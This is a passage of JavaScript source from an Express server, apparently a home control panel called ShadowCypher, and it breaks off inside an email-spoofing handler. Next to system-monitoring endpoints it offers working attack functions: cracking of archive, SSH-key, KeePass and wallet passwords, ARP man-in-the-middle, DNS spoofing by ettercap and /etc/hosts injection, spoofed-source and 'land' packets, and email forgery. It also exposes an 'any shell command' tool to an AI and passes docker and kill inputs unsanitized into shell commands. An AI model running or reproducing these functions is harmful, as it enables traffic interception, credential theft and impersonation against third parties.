    { name: 'open_port', description: 'Open a port in the firewall', parameters: { port: 'number', protocol: 'string' } },
    { name: 'close_port', description: 'Close a port', parameters: { port: 'number', protocol: 'string' } },
    { name: 'get_bandwidth', description: 'Get current bandwidth usage per interface' },
    { name: 'get_connections', description: 'Get active network connections' },
    { name: 'get_ports', description: 'List all listening ports' },
    { name: 'get_disk', description: 'Get disk usage information' },
    { name: 'get_temperatures', description: 'Get CPU/GPU temperatures' },
    { name: 'run_command', description: 'Run any shell command', parameters: { cmd: 'string' } },
    { name: 'get_docker', description: 'Get Docker containers and their status' },
    { name: 'docker_action', description: 'Start/stop/restart a Docker container', parameters: { name: 'string', action: 'string' } },
    { name: 'get_minecraft', description: 'Get Minecraft server status' },
    { name: 'scan_network', description: 'Force a network device scan' },
    { name: 'speed_test', description: 'Run a download speed test' },
    { name: 'get_wifi', description: 'Get WiFi connection info and nearby networks' },
    { name: 'install_package', description: 'Install an apt package', parameters: { name: 'string' } },
    { name: 'search_packages', description: 'Search for apt packages', parameters: { query: 'string' } },
    { name: 'run_pentest', description: 'Run a pentesting tool (ab, nikto, nmap-vuln, slowhttptest, gobuster, sqlmap, hping3)', parameters: { tool: 'string', target: 'string' } },
    { name: 'benchmark_dns', description: 'Benchmark common DNS servers to find the fastest one' },
    { name: 'audit_network', description: 'Run a security and performance audit on the router/gateway' },
    { name: 'intercept_signals', description: 'Sniff live network traffic for intelligence gathering', parameters: { count: 'number' } },
    { name: 'wifi_recon', description: 'Perform elite wireless reconnaissance to map nearby signals' },
    { name: 'get_threat_intel', description: 'Fetch the latest global network threat intelligence feeds' },
    { name: 'check_data_leak', description: 'Monitor for data breaches or leaked credentials', parameters: { email: 'string' } },
    { name: 'fetch_onion_intel', description: 'Safely acquire intelligence from .onion services in the darknet', parameters: { url: 'string' } }
];

// ═══════════ PC HUB - System Control Center ═══════════

// GPU info and control
app.get('/api/hub/gpu', async (_, res) => {
    try {
        const info = await run('nvidia-smi --query-gpu=name,driver_version,temperature.gpu,utilization.gpu,utilization.memory,memory.used,memory.total,power.draw,power.limit,fan.speed,clocks.gr,clocks.mem --format=csv,noheader,nounits 2>/dev/null');
        const procs = await run('nvidia-smi --query-compute-apps=pid,name,used_memory --format=csv,noheader,nounits 2>/dev/null');
        if (!info.trim()) return res.json({ error: 'nvidia-smi not available' });
        const p = info.trim().split(', ');
        res.json({
            name: p[0], driver: p[1], tempC: +p[2], gpuUtil: +p[3], memUtil: +p[4],
            memUsedMB: +p[5], memTotalMB: +p[6], powerW: +p[7], powerLimitW: +p[8],
            fanPct: +p[9], clockMHz: +p[10], memClockMHz: +p[11],
            processes: procs.trim().split('\n').filter(l => l.trim()).map(l => {
                const c = l.split(', '); return { pid: c[0], name: c[1], memMB: c[2] };
            })
        });
    } catch (e) { res.json({ error: e.message }); }
});

// CPU detailed info
app.get('/api/hub/cpu', async (_, res) => {
    try {
        const model = await run("cat /proc/cpuinfo | grep 'model name' | head -1 | sed 's/.*: //'");
        const freq = await run("cat /proc/cpuinfo | grep 'cpu MHz' | head -1 | awk '{print $4}'");
        const temps = await run("sensors 2>/dev/null | grep -E 'Tctl|Tccd|Core' | head -4");
        const loadavg = await run("cat /proc/loadavg");
        const uptime = await run("uptime -p");
        const top5 = await run("ps aux --sort=-%cpu | head -6 | tail -5");
        const perCore = await run("mpstat -P ALL 1 1 2>/dev/null | tail -13 || cat /proc/stat | head -13");
        res.json({
            model: model.trim(),
            freqMHz: parseFloat(freq) || 0,
            temps: temps.trim().split('\n').map(l => l.trim()).filter(Boolean),
            loadAvg: loadavg.trim(),
            uptime: uptime.trim(),
            topProcesses: top5.trim().split('\n').map(l => {
                const p = l.trim().split(/\s+/); return { user: p[0], pid: p[1], cpu: p[2], mem: p[3], cmd: p.slice(10).join(' ') };
            }),
            perCore: perCore.trim()
        });
    } catch (e) { res.json({ error: e.message }); }
});

// Process manager
app.get('/api/hub/processes', async (_, res) => {
    try {
        const out = await run("ps aux --sort=-%mem | head -31");
        const lines = out.trim().split('\n');
        const procs = lines.slice(1).map(l => {
            const p = l.trim().split(/\s+/);
            return { user: p[0], pid: +p[1], cpu: +p[2], mem: +p[3], vsz: +p[4], rss: +p[5], stat: p[7], cmd: p.slice(10).join(' ') };
        });
        res.json(procs);
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/hub/kill-process', requireAuth, async (req, res) => {
    const { pid, signal } = req.body;
    if (!pid) return res.json({ error: 'PID required' });
    const sig = signal || 'TERM';
    try {
        await run('kill -' + sig + ' ' + parseInt(pid));
        res.json({ success: true, message: 'Signal ' + sig + ' sent to PID ' + pid });
    } catch (e) { res.json({ error: e.message }); }
});

// Docker management
app.get('/api/hub/docker', async (_, res) => {
    try {
        const containers = await run('docker ps -a --format "{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}|{{.Size}}" 2>/dev/null');
        const images = await run('docker images --format "{{.Repository}}:{{.Tag}}|{{.Size}}|{{.ID}}" 2>/dev/null');
        res.json({
            containers: containers.trim().split('\n').filter(Boolean).map(l => {
                const p = l.split('|'); return { id: p[0], name: p[1], image: p[2], status: p[3], ports: p[4], size: p[5] };
            }),
            images: images.trim().split('\n').filter(Boolean).map(l => {
                const p = l.split('|'); return { name: p[0], size: p[1], id: p[2] };
            })
        });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/hub/docker/action', requireAuth, async (req, res) => {
    const { container, action } = req.body;
    if (!container || !['start', 'stop', 'restart', 'pause', 'unpause', 'rm'].includes(action)) return res.json({ error: 'Invalid' });
    try {
        const out = await run('docker ' + action + ' ' + container + ' 2>&1');
        res.json({ success: true, output: out.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// Sensors
app.get('/api/hub/sensors', async (_, res) => {
    try {
        const out = await run('sensors -j 2>/dev/null || sensors 2>/dev/null');
        try { res.json(JSON.parse(out)); } catch (_) { res.json({ raw: out }); }
    } catch (e) { res.json({ error: e.message }); }
});

// Network bandwidth monitor
app.get('/api/hub/bandwidth', async (_, res) => {
    try {
        const bwIface = await getWirelessIface() || await getPrimaryIface() || "wlo1";
        const rx1 = await run("cat /sys/class/net/" + bwIface + "/statistics/rx_bytes 2>/dev/null || echo 0");
        const tx1 = await run("cat /sys/class/net/" + bwIface + "/statistics/tx_bytes 2>/dev/null || echo 0");
        await new Promise(r => setTimeout(r, 1000));
        const rx2 = await run("cat /sys/class/net/" + bwIface + "/statistics/rx_bytes 2>/dev/null || echo 0");
        const tx2 = await run("cat /sys/class/net/" + bwIface + "/statistics/tx_bytes 2>/dev/null || echo 0");
        res.json({
            rxBytesPerSec: parseInt(rx2) - parseInt(rx1),
            txBytesPerSec: parseInt(tx2) - parseInt(tx1),
            rxTotalBytes: parseInt(rx2),
            txTotalBytes: parseInt(tx2)
        });
    } catch (e) { res.json({ error: e.message }); }
});

// USB devices
app.get('/api/hub/usb', async (_, res) => {
    try {
        const out = await run('lsusb 2>/dev/null');
        const devices = out.trim().split('\n').map(l => {
            const m = l.match(/Bus (\d+) Device (\d+): ID (\S+) (.+)/);
            return m ? { bus: m[1], device: m[2], id: m[3], name: m[4] } : null;
        }).filter(Boolean);
        res.json(devices);
    } catch (e) { res.json({ error: e.message }); }
});

// Tailscale status
app.get('/api/hub/tailscale', async (_, res) => {
    try {
        const status = await run('tailscale status --json 2>/dev/null');
        res.json(JSON.parse(status));
    } catch (e) { res.json({ error: e.message }); }
});

// Ollama models
app.get('/api/hub/ollama', async (_, res) => {
    try {
        const out = await run('ollama list 2>/dev/null');
        const running = await run('ollama ps 2>/dev/null');
        res.json({ models: out.trim(), running: running.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// Power management
app.post('/api/hub/power', requireAuth, async (req, res) => {
    const { action } = req.body;
    if (action === 'suspend') { await run('systemctl suspend'); res.json({ success: true }); }
    else if (action === 'reboot') { await run('sudo reboot'); res.json({ success: true }); }
    else if (action === 'shutdown') { await run('sudo shutdown now'); res.json({ success: true }); }
    else res.json({ error: 'Unknown action' });
});

// Bluetooth
app.get('/api/hub/bluetooth', async (_, res) => {
    try {
        const devices = await run('bluetoothctl devices 2>/dev/null');
        const info = await run('bluetoothctl show 2>/dev/null');
        res.json({ devices: devices.trim(), info: info.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// Display / Screen info
app.get('/api/hub/display', async (_, res) => {
    try {
        const xrandr = await run('xrandr --current 2>/dev/null | head -20');
        res.json({ displays: xrandr.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// Crontab
app.get('/api/hub/crontab', async (_, res) => {
    try {
        const user = await run('crontab -l 2>/dev/null || echo "no crontab"');
        const system = await run('cat /etc/crontab 2>/dev/null');
        res.json({ user: user.trim(), system: system.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// Startup apps
app.get('/api/hub/autostart', async (_, res) => {
    try {
        const apps = await run('ls -la ~/.config/autostart/ 2>/dev/null');
        const systemd = await run('systemctl list-unit-files --type=service --state=enabled --no-pager 2>/dev/null | head -30');
        res.json({ autostart: apps.trim(), enabledServices: systemd.trim() });
    } catch (e) { res.json({ error: e.message }); }
});

// ═══════════ FILE CRACKING & FORENSICS ═══════════

// Hash extraction from files (converts files to crackable hashes)
app.post('/api/crack/extract-hash', requireAuth, async (req, res) => {
    const { filePath, fileType } = req.body;
    if (!filePath) return res.json({ error: 'File path required' });
    const fp = filePath.replace(/[;&|`$]/g, '');
    const extractors = {
        'zip': `zip2john "${fp}" 2>/dev/null || python3 -c "
import zipfile,hashlib,sys
try:
    z=zipfile.ZipFile('${fp}')
    for i in z.infolist():
        if i.flag_bits & 0x1:
            print(f'[ENCRYPTED] {i.filename} (size:{i.file_size} compress:{i.compress_size})')
    print('Use: fcrackzip -D -p wordlist.txt -u ${fp}')
except Exception as e: print(str(e))
"`,
        'rar': `rar2john "${fp}" 2>/dev/null || unrar t -p- "${fp}" 2>&1 | head -10`,
        'pdf': `pdf2john "${fp}" 2>/dev/null || pdfcrack --info "${fp}" 2>/dev/null || python3 -c "
import subprocess
r=subprocess.run(['qpdf','--check','${fp}'],capture_output=True,text=True)
print(r.stdout or r.stderr or 'Could not analyze PDF')
" 2>/dev/null`,
        'office': `office2john "${fp}" 2>/dev/null`,
        'ssh-key': `ssh2john "${fp}" 2>/dev/null || python3 /usr/share/john/ssh2john.py "${fp}" 2>/dev/null`,
        'keepass': `keepass2john "${fp}" 2>/dev/null`,
        'gpg': `gpg2john "${fp}" 2>/dev/null`,
        '7z': `7z2john "${fp}" 2>/dev/null || 7z l -slt "${fp}" 2>/dev/null | head -30`,
        'luks': `cryptsetup luksDump "${fp}" 2>/dev/null | head -20`,
        'auto': `file "${fp}" 2>/dev/null && echo "---" && strings "${fp}" 2>/dev/null | head -20`
    };
    const extractor = extractors[fileType] || extractors['auto'];
    try {
        const out = await run(extractor);
        res.json({ hash: out.trim(), fileType, filePath: fp });
    } catch (e) { res.json({ error: e.message }); }
});

// Crack files directly
app.post('/api/crack/file', requireAuth, async (req, res) => {
    const { filePath, method, fileType, customWordlist, mask } = req.body;
    if (!filePath) return res.json({ error: 'File path required' });
    const fp = filePath.replace(/[;&|`$]/g, '');
    const wl = (customWordlist || WORDLIST).replace(/[;&|`$]/g, '');
    let cmd = '';

    if (fileType === 'zip' || (!fileType && fp.match(/\.zip$/i))) {
        if (method === 'bruteforce') {
            cmd = `fcrackzip -b -c aA1! -l 1-8 -u "${fp}" 2>&1`;
        } else if (method === 'mask' && mask) {
            cmd = `fcrackzip -b -c ${mask} -l 1-8 -u "${fp}" 2>&1`;
        } else {
            cmd = `fcrackzip -D -p "${wl}" -u "${fp}" 2>&1`;
        }
    } else if (fileType === 'pdf' || (!fileType && fp.match(/\.pdf$/i))) {
        if (method === 'bruteforce') {
            cmd = `pdfcrack -f "${fp}" --minpw=1 --maxpw=6 2>&1 | tail -20`;
        } else {
            cmd = `pdfcrack -f "${fp}" -w "${wl}" 2>&1 | tail -20`;
        }
    } else if (fileType === 'rar' || (!fileType && fp.match(/\.rar$/i))) {
        if (method === 'bruteforce') {
            cmd = `rarcrack "${fp}" --type rar --threads 4 2>&1 | tail -20`;
        } else {
            cmd = `unrar e -p- "${fp}" 2>&1 | head -5; echo "Use hashcat with rar2john hash for dictionary attack"`;
        }
    } else {
        // Generic - use john the ripper
        const hashFile = '/tmp/sc_crack_' + Date.now() + '.hash';
        const type2john = {
            'ssh-key': 'ssh2john', 'keepass': 'keepass2john', 'gpg': 'gpg2john',
            'office': 'office2john', '7z': '7z2john'
        };
        const converter = type2john[fileType] || 'file';
        if (converter !== 'file') {
            cmd = `${converter} "${fp}" > ${hashFile} 2>/dev/null && john "${hashFile}" --wordlist="${wl}" 2>&1 | tail -20 && john "${hashFile}" --show 2>/dev/null; rm -f ${hashFile}`;
        } else {
            cmd = `file "${fp}" 2>/dev/null; echo "---"; echo "Auto-detect: trying common crackers..."; fcrackzip -D -p "${wl}" -u "${fp}" 2>/dev/null || pdfcrack -f "${fp}" -w "${wl}" 2>/dev/null | tail -10 || echo "Could not auto-detect file type. Specify fileType."`;
        }
    }

    try {
        const out = await run('timeout 120 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
        res.json({ output: out.trim(), method: method || 'dictionary', filePath: fp });
    } catch (e) { res.json({ output: e.message }); }
});

// Hashcat GPU cracking with all modes
app.post('/api/crack/hashcat', requireAuth, async (req, res) => {
    const { hashFile, hashMode, attack, mask, rules, customWordlist } = req.body;
    if (!hashFile || !hashMode) return res.json({ error: 'hashFile and hashMode required' });
    const hf = hashFile.replace(/[;&|`$]/g, '');
    const wl = (customWordlist || WORDLIST).replace(/[;&|`$]/g, '');
    let cmd = 'hashcat';
    cmd += ' -m ' + parseInt(hashMode);
    cmd += ' --force --status --status-timer=5';

    if (attack === 'bruteforce') {
        cmd += ' -a 3 "' + hf + '"';
        if (mask) cmd += ' "' + mask.replace(/[;&|`$]/g, '') + '"';
        else cmd += ' ?a?a?a?a?a?a?a?a';
    } else if (attack === 'combinator') {
        cmd += ' -a 1 "' + hf + '" "' + wl + '" "' + wl + '"';
    } else if (attack === 'rule') {
        const ruleFile = rules || '/usr/share/hashcat/rules/best64.rule';
        cmd += ' -a 0 "' + hf + '" "' + wl + '" -r "' + ruleFile.replace(/[;&|`$]/g, '') + '"';
    } else {
        cmd += ' -a 0 "' + hf + '" "' + wl + '"';
    }
    cmd += ' 2>&1 | tail -40';

    try {
        const out = await run('timeout 300 ' + cmd);
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// Wordlist generator
app.post('/api/crack/generate-wordlist', requireAuth, async (req, res) => {
    const { method, target, minLen, maxLen, pattern } = req.body;
    const outFile = path.join(__dirname, 'wordlists', 'custom_' + Date.now() + '.txt');
    let cmd = '';
    if (method === 'cewl' && target) {
        const t = target.replace(/[;&|`$]/g, '');
        cmd = `cewl -d 2 -m ${minLen || 4} -w "${outFile}" "${t}" 2>&1 && wc -l "${outFile}"`;
    } else if (method === 'crunch') {
        const mn = parseInt(minLen) || 4;
        const mx = parseInt(maxLen) || 8;
        const chars = pattern || 'abcdefghijklmnopqrstuvwxyz0123456789';
        cmd = `crunch ${mn} ${mx} ${chars.replace(/[;&|`$]/g, '')} -o "${outFile}" 2>&1 | tail -5 && wc -l "${outFile}"`;
    } else if (method === 'combinator') {
        cmd = `cat "${WORDLIST}" | head -10000 | while read w; do echo "$w"; echo "$w"123; echo "$w"1; echo "$w"!; echo "$w"2024; echo "$w"2025; done > "${outFile}" && wc -l "${outFile}"`;
    } else {
        return res.json({ error: 'Method required: cewl, crunch, or combinator' });
    }
    try {
        const out = await run('timeout 60 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
        res.json({ output: out.trim(), wordlist: outFile });
    } catch (e) { res.json({ error: e.message }); }
});

// Steganography - extract hidden data
app.post('/api/crack/steg', requireAuth, async (req, res) => {
    const { filePath, password, method } = req.body;
    if (!filePath) return res.json({ error: 'File path required' });
    const fp = filePath.replace(/[;&|`$]/g, '');
    let cmd = '';
    if (method === 'steghide-extract') {
        cmd = password ? `steghide extract -sf "${fp}" -p "${password.replace(/"/g, '')}" -f 2>&1` : `steghide extract -sf "${fp}" -p "" -f 2>&1`;
    } else if (method === 'steghide-info') {
        cmd = `steghide info "${fp}" -p "" 2>&1 || steghide info "${fp}" 2>&1`;
    } else if (method === 'stegseek') {
        cmd = `stegseek "${fp}" "${WORDLIST}" 2>&1`;
    } else if (method === 'binwalk') {
        cmd = `binwalk "${fp}" 2>&1`;
    } else if (method === 'binwalk-extract') {
        cmd = `binwalk -e "${fp}" 2>&1 && ls -la _${path.basename(fp)}.extracted/ 2>/dev/null`;
    } else if (method === 'exiftool') {
        cmd = `exiftool "${fp}" 2>/dev/null`;
    } else if (method === 'strings') {
        cmd = `strings "${fp}" 2>/dev/null | head -100`;
    } else if (method === 'hexdump') {
        cmd = `hexdump -C "${fp}" 2>/dev/null | head -50`;
    } else if (method === 'foremost') {
        cmd = `foremost -i "${fp}" -o /tmp/foremost_out_$$ 2>&1 && ls -la /tmp/foremost_out_$$/ 2>/dev/null`;
    } else {
        cmd = `file "${fp}" && echo "---EXIF---" && exiftool "${fp}" 2>/dev/null | head -30 && echo "---STRINGS---" && strings "${fp}" 2>/dev/null | head -30 && echo "---BINWALK---" && binwalk "${fp}" 2>/dev/null`;
    }
    try {
        const out = await run(cmd);
        res.json({ output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// Batch install cracking tools
app.post('/api/crack/install-tools', requireAuth, async (req, res) => {
    try {
        const cmd = 'sudo apt-get install -y fcrackzip pdfcrack hashcat steghide binwalk foremost libimage-exiftool-perl cewl crunch rarcrack 2>&1 | tail -15';
        const out = await run(cmd);
        res.json({ output: out.trim(), success: true });
    } catch (e) { res.json({ error: e.message }); }
});

// List hashcat modes reference
app.get('/api/crack/hashcat-modes', (_, res) => {
    res.json({
        common: [
            { mode: 0, name: 'MD5', speed: 'fast' },
            { mode: 100, name: 'SHA1', speed: 'fast' },
            { mode: 1000, name: 'NTLM', speed: 'fast' },
            { mode: 1400, name: 'SHA-256', speed: 'medium' },
            { mode: 1700, name: 'SHA-512', speed: 'medium' },
            { mode: 1800, name: 'sha512crypt (Linux /etc/shadow)', speed: 'slow' },
            { mode: 3200, name: 'bcrypt', speed: 'very slow' },
            { mode: 500, name: 'md5crypt (Linux /etc/shadow)', speed: 'slow' },
            { mode: 5600, name: 'NetNTLMv2', speed: 'medium' },
            { mode: 13100, name: 'Kerberos TGS-REP', speed: 'slow' },
        ],
        files: [
            { mode: 17200, name: 'PKZIP (compressed)', speed: 'medium' },
            { mode: 17210, name: 'PKZIP (uncompressed)', speed: 'fast' },
            { mode: 17220, name: 'PKZIP (compressed multi)', speed: 'medium' },
            { mode: 17225, name: 'PKZIP (mixed)', speed: 'medium' },
            { mode: 17230, name: 'PKZIP (compressed multi2)', speed: 'medium' },
            { mode: 13600, name: 'WinZip', speed: 'slow' },
            { mode: 23700, name: 'RAR3-hp', speed: 'very slow' },
            { mode: 23800, name: 'RAR3-p (uncompressed)', speed: 'slow' },
            { mode: 13000, name: 'RAR5', speed: 'very slow' },
            { mode: 10400, name: 'PDF 1.1-1.3', speed: 'fast' },
            { mode: 10500, name: 'PDF 1.4-1.6', speed: 'slow' },
            { mode: 10600, name: 'PDF 1.7 Level 3', speed: 'fast' },
            { mode: 10700, name: 'PDF 1.7 Level 8', speed: 'very slow' },
            { mode: 9400, name: 'Office 2007', speed: 'slow' },
            { mode: 9500, name: 'Office 2010', speed: 'slow' },
            { mode: 9600, name: 'Office 2013', speed: 'very slow' },
            { mode: 25300, name: 'Office 2016', speed: 'very slow' },
        ],
        wifi: [
            { mode: 22000, name: 'WPA-PMKID-PBKDF2', speed: 'slow' },
            { mode: 22001, name: 'WPA-PMK-PMKID+EAPOL', speed: 'slow' },
        ],
        crypto: [
            { mode: 11300, name: 'Bitcoin/Litecoin wallet.dat', speed: 'very slow' },
            { mode: 16600, name: 'Electrum Wallet', speed: 'slow' },
            { mode: 13400, name: 'KeePass 1/2', speed: 'very slow' },
            { mode: 23500, name: 'AxCrypt 2', speed: 'slow' },
            { mode: 15700, name: 'Ethereum Wallet PBKDF2', speed: 'very slow' },
            { mode: 15600, name: 'Ethereum Wallet scrypt', speed: 'very slow' },
            { mode: 22500, name: 'MultiBit Classic .key', speed: 'slow' },
        ]
    });
});

// ═══════════ SPOOFING SUITE ═══════════

// --- MAC SPOOFING ---

// Get current MAC info for all interfaces
app.get('/api/spoof/mac/status', async (_, res) => {
    try {
        const linkData = await run('ip -o link show 2>/dev/null');
        const result = [];
        for (const line of linkData.split('\n')) {
            const nameMatch = line.match(/^\d+:\s+(\S+?):/);
            if (!nameMatch || nameMatch[1] === 'lo') continue;
            const name = nameMatch[1].split('@')[0];
            try {
                const current = (await run('cat /sys/class/net/' + name + '/address 2>/dev/null')).trim();
                if (!current || current === '00:00:00:00:00:00') continue;
                const state = (await run('cat /sys/class/net/' + name + '/operstate 2>/dev/null')).trim();
                // Try permaddr from ip link output first, then ethtool
                let permanent = '';
                const permMatch = line.match(/permaddr\s+([0-9a-f:]{17})/i);
                if (permMatch) {
                    permanent = permMatch[1];
                } else {
                    try { permanent = (await run('sudo ethtool -P ' + name + ' 2>/dev/null')).replace(/.*:\s*/, '').trim(); } catch(_) {}
                }
                const spoofed = permanent && permanent !== '00:00:00:00:00:00' && current.toLowerCase() !== permanent.toLowerCase();
                result.push({ iface: name, current, permanent: permanent || 'same as current', state, spoofed: !!spoofed });
            } catch(_) {}
        }
        res.json({ interfaces: result });
    } catch (e) { res.json({ error: e.message }); }
});

// Spoof MAC address
app.post('/api/spoof/mac', requireAuth, async (req, res) => {
    const { iface, method, customMac, vendor } = req.body;
    if (!iface) return res.json({ error: 'Interface required' });
    const i = iface.replace(/[^a-zA-Z0-9_-]/g, '');
    const results = [];
    try {
        await run(`sudo ip link set ${i} down 2>/dev/null`);
        results.push('Interface ' + i + ' brought down');

        if (method === 'random') {
            const out = await run(`sudo macchanger -r ${i} 2>&1`);
            results.push(out);
        } else if (method === 'specific' && customMac) {
            const mac = customMac.replace(/[^0-9a-fA-F:]/g, '');
            const out = await run(`sudo macchanger -m ${mac} ${i} 2>&1`);
            results.push(out);
        } else if (method === 'same-vendor') {
            const out = await run(`sudo macchanger -a ${i} 2>&1`);
            results.push(out);
        } else if (method === 'any-vendor') {
            const out = await run(`sudo macchanger -A ${i} 2>&1`);
            results.push(out);
        } else if (method === 'burned-in') {
            const out = await run(`sudo macchanger -p ${i} 2>&1`);
            results.push('Restored original (burned-in) MAC');
            results.push(out);
        } else {
            const out = await run(`sudo macchanger -r ${i} 2>&1`);
            results.push(out);
        }

        await run(`sudo ip link set ${i} up 2>/dev/null`);
        results.push('Interface ' + i + ' brought back up');

        const newMac = (await run(`cat /sys/class/net/${i}/address 2>/dev/null`)).trim();
        results.push('New MAC: ' + newMac);
        res.json({ success: true, results, newMac });
    } catch (e) {
        await run(`sudo ip link set ${i} up 2>/dev/null`);
        res.json({ error: e.message, results });
    }
});

// Restore original MAC
app.post('/api/spoof/mac/restore', requireAuth, async (req, res) => {
    const { iface } = req.body;
    if (!iface) return res.json({ error: 'Interface required' });
    const i = iface.replace(/[^a-zA-Z0-9_-]/g, '');
    try {
        await run(`sudo ip link set ${i} down`);
        const out = await run(`sudo macchanger -p ${i} 2>&1`);
        await run(`sudo ip link set ${i} up`);
        const mac = (await run(`cat /sys/class/net/${i}/address`)).trim();
        res.json({ success: true, output: out, mac });
    } catch (e) { res.json({ error: e.message }); }
});

// --- ARP SPOOFING (MITM) ---

let arpSpoofProc = null;

app.post('/api/spoof/arp/start', requireAuth, async (req, res) => {
    const { targetIp, gatewayIp, iface } = req.body;
    if (!targetIp || !gatewayIp) return res.json({ error: 'Target IP and Gateway IP required' });
    const t = targetIp.replace(/[^0-9.]/g, '');
    const g = gatewayIp.replace(/[^0-9.]/g, '');
    const i = (iface || await getPrimaryIface()).replace(/[^a-zA-Z0-9_-]/g, '');

    if (arpSpoofProc) return res.json({ error: 'ARP spoof already running. Stop it first.' });

    try {
        // Enable IP forwarding so intercepted traffic still reaches destination
        await run('sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null');

        // Start arpspoof in both directions (full MITM)
        const { spawn } = require('child_process');
        arpSpoofProc = spawn('sudo', ['arpspoof', '-i', i, '-t', t, '-r', g], { detached: true, stdio: ['ignore', 'pipe', 'pipe'] });

        let output = '';
        arpSpoofProc.stdout.on('data', d => { output += d.toString(); });
        arpSpoofProc.stderr.on('data', d => { output += d.toString(); });
        arpSpoofProc.on('close', () => { arpSpoofProc = null; });

        await new Promise(r => setTimeout(r, 2000));
        res.json({ success: true, pid: arpSpoofProc.pid, message: 'ARP MITM active: ' + t + ' <-> ' + g + ' on ' + i, output: output.substring(0, 300) });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/spoof/arp/stop', requireAuth, async (req, res) => {
    try {
        if (arpSpoofProc) {
            process.kill(-arpSpoofProc.pid, 'SIGTERM');
            arpSpoofProc = null;
        }
        await run('sudo pkill -f arpspoof 2>/dev/null || true');
        await run('sudo sysctl -w net.ipv4.ip_forward=0 2>/dev/null');
        res.json({ success: true, message: 'ARP spoofing stopped, IP forwarding disabled' });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/api/spoof/arp/status', async (_, res) => {
    const running = arpSpoofProc !== null;
    let procCheck = false;
    try { const p = await run('pgrep -a arpspoof 2>/dev/null'); procCheck = p.trim().length > 0; } catch(_) {}
    const forwarding = (await run('cat /proc/sys/net/ipv4/ip_forward 2>/dev/null')).trim() === '1';
    res.json({ running: running || procCheck, forwarding, pid: arpSpoofProc?.pid || null });
});

// --- DNS SPOOFING ---

app.post('/api/spoof/dns/start', requireAuth, async (req, res) => {
    const { targetDomain, spoofIp, iface } = req.body;
    if (!targetDomain || !spoofIp) return res.json({ error: 'Domain and spoof IP required' });
    const domain = targetDomain.replace(/[^a-zA-Z0-9.-]/g, '');
    const ip = spoofIp.replace(/[^0-9.]/g, '');
    const i = (iface || await getPrimaryIface()).replace(/[^a-zA-Z0-9_-]/g, '');

    try {
        // Write hosts file for dnsspoof
        const hostsFile = '/tmp/shadowcypher_dns_hosts';
        fs.writeFileSync(hostsFile, ip + '\t' + domain + '\n' + ip + '\t*.' + domain + '\n');

        // Method 1: /etc/hosts injection (simple, local only)
        const hostsBackup = await run('cat /etc/hosts 2>/dev/null');
        await run(`sudo bash -c 'echo "${ip} ${domain}" >> /etc/hosts'`);
        await run('sudo systemd-resolve --flush-caches 2>/dev/null || sudo resolvectl flush-caches 2>/dev/null');

        // Method 2: Try ettercap DNS spoofing (network-wide)
        let ettercapOut = '';
        try {
            const etterDns = '/tmp/etter.dns';
            fs.writeFileSync(etterDns, domain + ' A ' + ip + '\n*.' + domain + ' A ' + ip + '\n');
            await run(`sudo timeout 5 ettercap -T -q -i ${i} -P dns_spoof -M arp /// /// 2>&1 &`);
            ettercapOut = 'Ettercap DNS spoof started on ' + i;
        } catch(e) { ettercapOut = 'Ettercap unavailable: ' + e.message; }

        res.json({
            success: true,
            results: [
                '/etc/hosts: ' + domain + ' -> ' + ip,
                'DNS cache flushed',
                ettercapOut,
                'Hosts file: ' + hostsFile
            ]
        });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/spoof/dns/stop', requireAuth, async (req, res) => {
    try {
        await run('sudo pkill -f ettercap 2>/dev/null || true');
        await run('sudo pkill -f dnsspoof 2>/dev/null || true');
        // Remove injected hosts entries
        await run(`sudo sed -i '/# SHADOWCYPHER_DNS/d' /etc/hosts 2>/dev/null || true`);
        await run('sudo systemd-resolve --flush-caches 2>/dev/null || true');
        fs.unlinkSync('/tmp/shadowcypher_dns_hosts').catch(() => {});
        res.json({ success: true, message: 'DNS spoofing stopped, cache flushed' });
    } catch (e) { res.json({ error: e.message }); }
});

// --- IP SPOOFING ---

app.post('/api/spoof/ip', requireAuth, async (req, res) => {
    const { targetIp, spoofIp, port, method, count } = req.body;
    if (!targetIp || !spoofIp) return res.json({ error: 'Target IP and spoof source IP required' });
    const t = targetIp.replace(/[^0-9.]/g, '');
    const s = spoofIp.replace(/[^0-9.]/g, '');
    const p = parseInt(port) || 80;
    const n = Math.min(parseInt(count) || 10, 100);
    let cmd = '';

    switch (method) {
        case 'syn':
            cmd = `sudo hping3 -S -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
            break;
        case 'udp':
            cmd = `sudo hping3 --udp -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
            break;
        case 'icmp':
            cmd = `sudo hping3 --icmp -a ${s} -c ${n} ${t} 2>&1`;
            break;
        case 'land':
            cmd = `sudo hping3 -S -a ${t} -p ${p} -c ${n} ${t} 2>&1`;
            break;
        default:
            cmd = `sudo hping3 -S -a ${s} -p ${p} -c ${n} ${t} 2>&1`;
    }

    try {
        const out = await run('timeout 30 ' + cmd, 35000);
        res.json({ success: true, output: out.trim() });
    } catch (e) { res.json({ output: e.message }); }
});

// --- EMAIL SPOOFING ---

app.post('/api/spoof/email', requireAuth, async (req, res) => {
    const { fromEmail, fromName, toEmail, subject, body: emailBody, smtpServer } = req.body;
    if (!fromEmail || !toEmail || !subject) return res.json({ error: 'From, To, and Subject required' });

    const from = fromEmail.replace(/[`$]/g, '');
    const to = toEmail.replace(/[`$]/g, '');
    const subj = subject.replace(/[`$]/g, '');
    const bdy = (emailBody || 'Test').replace(/[`$]/g, '');
    const srv = (smtpServer || 'localhost').replace(/[^a-zA-Z0-9.-:]/g, '');
    const name = (fromName || '').replace(/[`$"]/g, '');

    try {
